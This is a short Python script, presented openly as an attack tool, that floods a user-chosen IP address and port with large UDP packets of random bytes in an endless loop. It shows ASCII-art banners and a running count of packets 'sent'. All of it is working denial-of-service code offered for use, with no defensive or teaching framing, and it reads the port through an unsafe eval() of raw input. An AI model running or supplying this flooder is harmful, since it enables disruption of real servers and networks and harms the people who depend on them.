import socket
import random
import time

def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(50000)
mine = """

          _____                                  
         /\    \                 ______          
        /::\    \               |::|   |         
       /::::\    \              |::|   |         
      /::::::\    \             |::|   |         
     /:::/\:::\    \            |::|   |         
    /:::/__\:::\    \           |::|   |         
   /::::\   \:::\    \          |::|   |         
  /::::::\   \:::\    \         |::|   |         
 /:::/\:::\   \:::\    \  ______|::|___|___ ____ 
/:::/__\:::\   \:::\____\|:::::::::::::::::|    |
\:::\   \:::\   \::/    /|:::::::::::::::::|____|
 \:::\   \:::\   \/____/  ~~~~~~|::|~~~|~~~      
  \:::\   \:::\    \            |::|   |         
   \:::\   \:::\____\           |::|   |         
    \:::\   \::/    /           |::|   |         
     \:::\   \/____/            |::|   |         
      \:::\    \                |::|   |         
       \:::\____\               |::|   |         
        \::/    /               |::|___|         
         \/____/                 ~~              
                                                 

"""
ip = input("Enter the IP: ")
port = eval(input("Enter the port: "))
sent = 0
time.sleep(3)
prGreen(mine)
time.sleep(3)
prGreen("Loading data; about to send attack")
time.sleep(3)
while True: 
    sock.sendto(bytes,(ip,port))
    sent = sent+1
    prGreen("Sent %s packet to %s through port : %s"%(sent,ip,port))
